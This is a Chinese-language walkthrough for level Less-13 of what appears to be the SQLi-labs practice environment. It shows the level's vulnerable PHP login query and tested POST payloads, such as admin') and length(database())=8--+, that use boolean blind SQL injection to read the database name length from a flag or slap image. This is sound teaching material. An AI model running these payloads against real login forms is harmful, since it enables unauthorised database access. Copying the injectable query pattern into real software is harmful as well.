# Less-13

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | POST · 盲注 |
| **闭合方式** | `')` |
| **成败信号** | flag.jpg / slap.jpg |
| **一句话** | 不显示数据，只给图片 |
| **核心 payload** | `uname=admin') and length(database())=8--+` |

---

**POST · 盲注 · 单引号 + 括号**

### 源码

```php
$sql = "SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";
if($row) {
    //echo 'Your Login name:'. $row['username'];   ← 被注释了！
    //echo 'Your Password:' .$row['password'];     ← 被注释了！
    echo '<img src="../images/flag.jpg" />';       // 成功 → 旗子图
} else {
    print_r(mysql_error());
    echo '<img src="../images/slap.jpg" />';       // 失败 → 巴掌图
}
```

### 特点：数据回显被注释掉了

源码里 `echo $row['username']` 全被 `//` 注释了，只留下一张图片。
所以 UNION 也能让页面变成"成功"，但**看不到数据**：

```
uname = admin') union select 1,2--+   →  出现 flag.jpg（但没有数据）
```

要拿数据只能走**布尔盲注**。

### 通关 payload（实测）

**闭合确认**
```
uname = admin') --+   →  flag.jpg   ✓
```

**布尔盲注（实测）**
```
uname = admin') and length(database())=8--+   →  flag.jpg  （真）
uname = admin') and length(database())=9--+   →  slap.jpg  （假）
```
→ 库名长度 = 8

判断标准：页面里出现 `flag.jpg` 即为真，出现 `slap.jpg` 即为假。

---

[← Less-12](Less-12.md) ｜ [返回目录](README.md) ｜ [Less-14 →](Less-14.md)